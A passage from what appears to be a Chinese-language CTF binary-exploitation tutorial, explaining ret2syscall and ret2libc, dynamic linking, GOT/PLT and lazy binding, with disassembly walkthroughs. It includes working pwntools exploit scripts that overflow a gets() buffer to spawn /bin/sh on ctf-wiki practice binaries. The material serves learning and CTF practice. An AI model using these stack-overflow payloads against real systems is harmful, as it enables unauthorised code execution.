class="hljs-comment">; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="hljs-number">0x0806eb68</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">esi</span> <span class="hljs-comment">; pop ebx ; pop edx ; ret</span><br><span class="hljs-number">0x0805c820</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">esi</span> <span class="hljs-comment">; pop ebx ; ret</span><br><span class="hljs-number">0x08050256</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">esp</span> <span class="hljs-comment">; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="hljs-number">0x0807b6ed</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">ss</span> <span class="hljs-comment">; pop ebx ; ret</span><br></code></pre></td></tr></table></figure>

<p>这里，我选择<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code>    这个可以直接控制其它三个寄存器。</p>
<p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址。</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Strings information</span><br><span class="hljs-section">============================================================</span><br>0x080be408 : /bin/sh<br></code></pre></td></tr></table></figure>

<p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">Gadgets information</span><br><span class="hljs-section">============================================================</span><br>0x08049421 : int 0x80<br>0x080890b5 : int 0xcf<br></code></pre></td></tr></table></figure>

<p>同时，也找到对应的地址了。<br>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80])<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>

<p>在这里我们关注一下payload，如下是它的详细解释</p>
<ul>
<li><strong><code>flat</code> 函数</strong>：是 <code>pwn</code> 库中的一个函数，用于将多个元素（可以是整数、字符串等）扁平化为一个字节串。在这里，它将一系列元素组合成一个用于发送给目标程序的攻击载荷。</li>
<li><strong><code>pop_eax_ret, 0xb</code></strong>:<code>pop_eax_ret</code>是一个地址，指向一个包含<code>pop eax; ret</code>指令序列的内存位置。0xb对应的系统调用,是execve系统调用，它用于执行一个程序。将0xb放在pop_eax_ret之后，当pop eax指令执行时，会将0xb这个系统调用号放入 EAX 寄存器，为后续的系统调用做准备。</li>
<li>**<code>pop_edx_ecx_ebx_ret:</code>**同上，将0, 0, binsh放到对应寄存器中</li>
<li><strong><code>int_0x80</code>指令地址</strong>：<code>int_0x80</code>是一个地址，指向包含<code>int 0x80</code>指令的内存位置。在 x86 架构下，<code>int 0x80</code>是进行系统调用的触发指令。当 EAX 寄存器中已经设置好系统调用号（<code>0xb</code>），并且其他相关寄存器（如 EBX、ECX、EDX）也设置好了相应的参数后，执行<code>int_0x80</code>指令就可以触发系统调用，实现诸如执行一个 shell（<code>/bin/sh</code>）等操作。</li>
</ul>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理：-3"><a href="#原理：-3" class="headerlink" title="原理："></a>原理：</h3><p>ret2libc 这种攻击方式主要是针对 动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数，因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”) 来打开 shell。</p>
<h3 id="什么是动态链接"><a href="#什么是动态链接" class="headerlink" title="什么是动态链接"></a>什么是动态链接</h3><p>动态链接 是指在程序装载时通过 动态链接器 将程序所需的所有 动态链接库(Dynamic linking library) 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。它诞生的最主要的的原因就是 静态链接 太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在 静态链接 的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过 动态链接 的方式就推迟这个链接过程到了程序运行时进行。这样做有以下几点好处：</p>
<ol>
<li><strong>节省内存、磁盘空间：</strong><br>如磁盘中有两个程序，p1、p2，且他们两个都包含 lib.o 这个模块，在 静态链接 的情况下他们在链接输出可执行文件时都会包含 lib.o 这个模块，这就造成了磁盘空间的浪费。当这两个程序运行时，内存中同样也就包含了这两个相同的模块，这也就使得内存空间被浪费。当系统中包含大量类似 lib.o 这种被多个程序共享的模块时，也就会造成很大空间的浪费。在 动态链接 的情况下，运行 p1 ，当系统发现需要用到 lib.o ，就会接着加载 lib.o 。这时我们运行 p2 ，就不需要重新加载 lib.o 了，因为此时 lib.o 已经在内存中了，系统仅需将两者链接起来，此时内存中就只有一个 lib.o 节省了内存空间。</li>
<li><strong>程序更新更简单:</strong><br>比如程序 p1 所使用的 lib.o 是由第三方提供的，等到第三方更新、或者为 lib.o 打补丁的时候，p1 就需要拿到第三方最新更新的 lib.o ，重新链接后在将其发布给用户。程序依赖的模块越多，就越发显得不方便，毕竟都是从网络上获取新资源。在 动态链接 的情况下，第三方更新 lib.o 后，理论上只需要覆盖掉原有的 lib.o ，就不必重新链接整个程序，在程序下一次运行时，新版本的目标文件就会自动装载到内存并且链接起来，就完成了升级的目标。</li>
<li><strong>增强程序扩展性和兼容性:</strong><br>动态链接 的程序在运行时可以动态地选择加载各种模块，也就是我们常常使用的插件。软件的开发商开发某个产品时会按照一定的规则制定好程序的接口，其他开发者就可以通过这种接口来编写符合要求的动态链接文件，以此来实现程序功能的扩展。增强兼容性是表现在 动态链接 的程序对不同平台的依赖差异性降低，比如对某个函数的实现机制不同，如果是 静态链接 的程序会为不同平台发布不同的版本，而在 动态链接 的情况下，只要不同的平台都能提供一个动态链接库包含该函数且接口相同，就只需用一个版本了。<br>总而言之，动态链接 的程序在运行时会根据自己所依赖的 动态链接库 ，通过 动态链接器 将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux 系统中，ELF 动态链接文件被称为 动态共享对象（Dynamic Shared Objects） ， 简称 共享对象 一般都是以 “.so” 为扩展名的文件；在 windows 系统中就是常常软件报错缺少 xxx.dll 文件。</li>
</ol>
<h3 id="GOT与PLT"><a href="#GOT与PLT" class="headerlink" title="GOT与PLT"></a>GOT与PLT</h3><hr>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/crpf61#">https://www.yuque.com/cyberangel/rg9gdm/crpf61#</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zheng__Huang/article/details/119484353">https://blog.csdn.net/Zheng__Huang/article/details/119484353</a><br><a target="_blank" rel="noopener" href="https://worktile.com/kb/p/30008">https://worktile.com/kb/p/30008</a></p>
<hr>
<p>这两个必须放到一起看。</p>
<p>**GOT(<code>Global Offset Table</code>|全局偏量表)**，包含所有需要动态链接的外部函数的地址（在第一次执行后）</p>
<p>**PLT(<code>Procedure Link Table</code>|过程链接表)**，过程链接表，包含调用外部函数的跳转指令（跳转到GOT表中），以及初始化外部调用指令（用于链接器动态绑定dl_runtime_resolve）</p>
<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>首先，系统调用（call）了在动态对象里的函数，例如<code>scanf</code>用汇编表示就是如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call scanf@plt   #不是真的这样写，只是举个例子<br></code></pre></td></tr></table></figure>

<p>然后我们跟进一下，会发现有三行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp QWORD PTR [rip+0x200a4a]	#0x201020<br>push 0x1<br>jmp 0x5b0<br></code></pre></td></tr></table></figure>

<p>意思是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 一个地址<br>push 一个值到栈<br>jmp 一个地址<br></code></pre></td></tr></table></figure>

<p>其实看函数名称就可以知道这里是<code>scanf</code>的PLT表，PLT是什么，先按下不表，我们先看第一个<code>jmp</code>跳到哪了。第一个<code>jmp</code>语句是<code>jmp QWORD PTR [rip+0x200a4a]	#0x201020</code>，其中<code>QWORD PTR</code>是一个操作数大小限定符，<code>QWORD</code> 代表 “Quad - Word”，即 8 个字节（64 位）。<code>PTR</code> 是 “pointer” 的缩写，表示指针类型。所以 “QWORD PTR” 的意思是按照 8 字节（64 位）的大小来读取内存中的数据作为指针。最后的<code>[rip+0x200a4a]</code>是一种相对寻址方式，以<code>rip</code>的值为基础，加上偏移量<code>0x200a4a</code>，计算出一个内存地址，即为<code>0x201020</code>在这个内存地址上读取数据。而这个地址就是就是PLT表对应的GOT表，而<code>0x201020</code>正是储存着下一条命令<code>push</code>的内存地址，我们用gdb的命令查看一下内存就可以看到,这个<code>0x5d6</code>就是<code>push 0x1</code>的地址。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x201020：	0x000005d6	0x00000000	0x00000000	0x0000000<br></code></pre></td></tr></table></figure>

<p>于是，我们就总结出了使用动态链接后的函数调用过程，即为</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">call</span> scnaf --&gt;</span> <span class="hljs-function"><span class="hljs-title">scanf</span>的PLT表 --&gt;</span> scanf的GOT表<br></code></pre></td></tr></table></figure>

<h4 id="深入"><a href="#深入" class="headerlink" title="深入"></a>深入</h4><p>上面是动态链接的工作过程的简述，下面我们讨论为什么要这样干：就是<strong>延迟绑定机制</strong>，这是一种在程序过程中动态链接库函数调用的优化机制。在动态链接中，程序中的函数调用可能会引用外部共享库（如 Linux 中的.so 文件）中的函数。延迟绑定机制不是在程序启动时就解析和绑定所有外部函数的地址，而是将这个过程推迟到函数第一次被调用时。但是此时此刻程序已经编译就好了，不可能把解析后的地址塞到程序要调用函数的那个地方，所以就需要PLT表和GOT表，其中，PLT表是一个代码段，包含了一系列用于调用外部函数的指令序列，而GOT 是一个数据段，用于存储外部函数的实际地址。</p>
<p>但是，这里就又有了一个新问题，当这个函数是第一次调用呢？即GOT表中还没有储存这个函数的实际地址的时候，程序有时怎样运行的呢，其实很简单，如下是<strong>首次调用流程</strong></p>
<ul>
<li>当程序第一次调用一个外部函数时，控制流会转到 PLT 中的相应条目。这个 PLT 条目会通过 GOT 中的相应条目来检查函数地址是否已经被解析。</li>
<li>由于是第一次调用，GOT 中的函数地址通常还未被解析，此时 PLT 中的代码会调用一个特殊的运行时解析函数（如在 Linux 系统中是<code>dl_runtime_resolve</code>）来查找并确定外部函数的实际地址。</li>
<li>一旦确定了函数地址，这个地址就会被存储在 GOT 中对应的位置。</li>
</ul>
<p>首次调用完后，GOT表中就储存了共享对象中某个函数的地址，下一次调用时，程序就会从GOT表中获取地址而不再需要运行时解析，这样就提高了后续调用的效率。</p>
<p>下面，我们来看一个实例，（来源：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/crpf61#%EF%BC%89">https://www.yuque.com/cyberangel/rg9gdm/crpf61#）</a><br>编写两个模块，一个是程序自身的代码模块，另一个是共享对象模块。以此来学习动态链接的程序是如何进行模块内、模块间的函数调用和数据访问，共享文件如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*共享对象*/</span><br>got_extern.c<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> b;<br><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;test\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>编写代码模块：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*代码模块*/</span><br>got.c<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> a;		&lt;--<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> b;		&lt;--<br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>; &lt;--<br><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>	a = <span class="hljs-number">1</span>;<br>	b = <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span><br>&#123;<br>	fun();<br>	test();<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hey!&quot;</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解释一下带箭头的三句：</p>
<ul>
<li><code>static int a;</code>：声明了一个静态的整型全局变量 <code>a</code>。静态全局变量的特点是它的作用域仅限于当前源文件（在这个例子中就是 <code>got.c</code> 文件），其他源文件无法直接访问它。这里对 <code>a</code> 进行了声明但未初始化，在 C 语言中，未初始化的静态全局变量会被自动初始化为 0。</li>
<li><code>extern int b;</code>：声明了一个整型的外部变量 <code>b</code>。这表明 <code>b</code> 是在其他源文件中定义的，在当前源文件中只是声明要使用它。</li>
<li><code>extern void test();</code>：声明了一个外部函数 <code>test()</code>，说明这个函数是在其他源文件中定义的，同样在当前源文件中只是声明要使用它，在链接阶段需要和其定义所在的源文件进行正确链接。</li>
</ul>
<p>然后将代码模块和共享模块一同编译</p>
<p>之后用objdump（Linux自带的反汇编命令）查看反汇编代码<code>objdump -D -Mintel got：</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000011b9 &lt;fun&gt;:<br>    11b9:	55                   	push   ebp<br>    11ba:	89 e5                	mov    ebp,esp<br>    11bc:	e8 63 00 00 00       	call   1224 &lt;__x86.get_pc_thunk.ax&gt;<br>    11c1:	05 3f 2e 00 00       	add    eax,0x2e3f<br>    11c6:	c7 80 24 00 00 00 01 	mov    DWORD PTR [eax+0x24],0x1<br>    11cd:	00 00 00 <br>    11d0:	8b 80 ec ff ff ff    	mov    eax,DWORD PTR [eax-0x14]<br>    11d6:	c7 00 02 00 00 00    	mov    DWORD PTR [eax],0x2<br>    11dc:	90                   	nop<br>    11dd:	5d                   	pop    ebp<br>    11de:	c3                   	ret    <br>000011df &lt;main&gt;:<br>    11df:	8d 4c 24 04          	lea    ecx,[esp+0x4]<br>    11e3:	83 e4 f0             	and    esp,0xfffffff0<br>    11e6:	ff 71 fc             	push   DWORD PTR [ecx-0x4]<br>    11e9:	55                   	push   ebp<br>    11ea:	89 e5                	mov    ebp,esp<br>    11ec:	53                   	push   ebx<br>    11ed:	51                   	push   ecx<br>    11ee:	e8 cd fe ff ff       	call   10c0 &lt;__x86.get_pc_thunk.bx&gt;<br>    11f3:	81 c3 0d 2e 00 00    	add    ebx,0x2e0d<br>    11f9:	e8 bb ff ff ff       	call   11b9 &lt;fun&gt;<br>    11fe:	e8 5d fe ff ff       	call   1060 &lt;test@plt&gt;<br>    1203:	83 ec 0c             	sub    esp,0xc<br>    1206:	8d 83 08 e0 ff ff    	lea    eax,[ebx-0x1ff8]<br>    120c:	50                   	push   eax<br>    120d:	e8 2e fe ff ff       	call   1040 &lt;printf@plt&gt;<br>    1212:	83 c4 10             	add    esp,0x10<br>    1215:	b8 00 00 00 00       	mov    eax,0x0<br>    121a:	8d 65 f8             	lea    esp,[ebp-0x8]<br>    121d:	59                   	pop    ecx<br>    121e:	5b                   	pop    ebx<br>    121f:	5d                   	pop    ebp<br>    1220:	8d 61 fc             	lea    esp,[ecx-0x4]<br>    1223:	c3                   	ret<br></code></pre></td></tr></table></figure>

<h5 id="模块内部调用："><a href="#模块内部调用：" class="headerlink" title="模块内部调用："></a>模块内部调用：</h5><p>main()函数中调用 fun()函数 ，指令为：<code>11f9:	e8 bb ff ff ff       	call   11b9 &lt;fun&gt;</code>，<br>fun() 函数所在的地址为 0x000011b9 ，机器码 e8 代表 call 指令，为什么后面是 bb ff ff ff 而不是 b9 11 00 00 （小端存储，数据的低位字节存于低地址，高位字节存于高地址。）呢？这后面的四个字节代表着目的地址相对于当前指令的下一条指令地址的偏移，即 0x11f9 + 0x5 + (-69) &#x3D; 0x11b9 ，0xffffffbb 是 -69 的补码形式，这样做就可以使程序无论被装载到哪里都会正常执行。（太底层了，理解就行）</p>
<h5 id="模块内部数据访问"><a href="#模块内部数据访问" class="headerlink" title="模块内部数据访问"></a>模块内部数据访问</h5><p>ELF 文件是由很多很多的 段(segment) 所组成，常见的就如 .text (代码段) 、.data(数据段，存放已经初始化的全局变量或静态变量)、.bss(数据段，存放未初始化全局变量)等，这样就能做到数据与指令分离互不干扰。在同一个模块中，一般前面的内存区域存放着代码后面的区域存放着数据(这里指的是 .data 段)。那么指令是如何访问远在 .data 段 中的数据呢?</p>
<p>观察 fun() 函数中给静态变量 a 赋值的指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">11bc:	e8 63 00 00 00       	call   1224 &lt;__x86.get_pc_thunk.ax&gt;<br>   11c1:	05 3f 2e 00 00       	add    eax,0x2e3f<br>   11c6:	c7 80 24 00 00 00 01 	mov    DWORD PTR [eax+0x24],0x1<br>   11cd:	00 00 00<br></code></pre></td></tr></table></figure>

<p>它首先调用了 __x86.get_pc_thunk.ax() 函数， __x86.get_pc_thunk.ax()函数代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00001224 &lt;__x86.get_pc_thunk.ax&gt;:<br>   1224:	8b 04 24             	mov    eax,DWORD PTR [esp]<br>   1227:	c3                   	ret<br></code></pre></td></tr></table></figure>

<p>这个函数的作用就是把返回地址的值放到 eax 寄存器中，也就是把0x000011c1保存到eax中，然后再加上 0x2e3f ，最后再加上 0x24 。即 0x000011c1 + 0x2e3f + 0x24 &#x3D; 0x4024，这个值就是相对于模块加载基址的值。通过这样就能访问到模块内部的数据。</p>
<img src = "https://cdn.nlark.com/yuque/0/2020/jpeg/574026/1596598382550-b6dd6a15-25e9-42c5-a30d-6e12e0991dbb.jpeg?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_20%2Ctext_Q3liZXJhbmdlbA%3D%3D%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10%2Fformat%2Cwebp%2Fresize%2Cw_690%2Climit_0%2Finterlace%2C1">

<h5 id="模块间数据访问"><a href="#模块间数据访问" class="headerlink" title="模块间数据访问"></a>模块间数据访问</h5><p>变量 b 被定义在其他模块中，其地址需要在程序装载时才能够确定。利用到前面的代码地址无关的思想，把地址相关的部分放入数据段中，然而这里的变量 b 的地址与其自身所在的模块装载的地址有关。解决：ELF 中在数据段里面建立了一个指向这些变量的指针数组，也就是我们所说的 GOT 表(Global offset Table， 全局偏移表 ），它的功能就是当代码需要引用全局变量时，可以通过 GOT 表间接引用。</p>
<p>查看反汇编代码中是如何访问变量 b 的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">11bc:	e8 63 00 00 00       	call   1224 &lt;__x86.get_pc_thunk.ax&gt;<br>   11c1:	05 3f 2e 00 00       	add    eax,0x2e3f<br>   11c6:	c7 80 24 00 00 00 01 	mov    DWORD PTR [eax+0x24],0x1<br>   11cd:	00 00 00 <br>   11d0:	8b 80 ec ff ff ff    	mov    eax,DWORD PTR [eax-0x14]<br>   11d6:	c7 00 02 00 00 00    	mov    DWORD PTR [eax],0x2<br></code></pre></td></tr></table></figure>

<p>计算变量 b 在 GOT 表中的位置，0x11c1 + 0x2e3f - 0x14 &#x3D; 0x3fec ，查看 GOT 表的位置。<br>命令 objdump -h got ，查看ELF文件中的节头内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.got          00000018  00003fe8  00003fe8  00002fe8  2**2<br></code></pre></td></tr></table></figure>

<p>这里可以看到 .got 在文件中的偏移是 0x00003fe8，现在来看在动态连接时需要重定位的项，使用 objdump -R got 命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00003fec R_386_GLOB_DAT    b<br></code></pre></td></tr></table></figure>

<p>可以看到变量b的地址需要重定位，位于0x00003fec，在GOT表中的偏移就是4，也就是第二项(每四个字节为一项)，这个值正好对应之前通过指令计算出来的偏移值。</p>
<h5 id="模块间函数调用"><a href="#模块间函数调用" class="headerlink" title="模块间函数调用"></a>模块间函数调用</h5><p>模块间函数调用用到了延迟绑定，都是函数名@plt的形式</p>
<h3 id="DEP防护"><a href="#DEP防护" class="headerlink" title="DEP防护"></a>DEP防护</h3><p>开启之后栈上就没有可执行权限了，和NX保护很像</p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p><em>这个实例先对简单，和ret2text很像</em></p>
<p><strong>示例：</strong><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1</a></p>
<p>查一下保护，开启了NX保护，32位</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Arch:       i386-32-little<br>RELRO:      Partial RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x8048000)<br>Stripped:   No<br>Debuginfo:  Yes<br></code></pre></td></tr></table></figure>

<p>查看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现了溢出点<code>gets(s);</code>，查看栈，或者手动测量，得知偏移量是112字节（0x70）</p>
<p>然后我们找<code>/bin/sh</code>地址为<code>0x08048720</code></p>
<p>然后我们找<code>system</code>函数，它在<code>secure</code>函数中被调用，但是它在动态库中，所以我们可以找到<code>system@plt</code>的地址，我们可以直接覆盖函数返回地址使其调用 system()@plt 模拟 system() 函数真实调用。地址为<code>08048460</code></p>
<p>于是，我们就可以构架如下exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>

<p>中间的<code>&#39;b&#39; * 4</code>是一个虚假的返回地址，因为调用一个函数是先要把一个返回地址压入栈，然后才是参数</p>
<h4 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h4><p>示例：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc1</a></p>
<p>查一下保护，NX保护开启，32位程序</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span 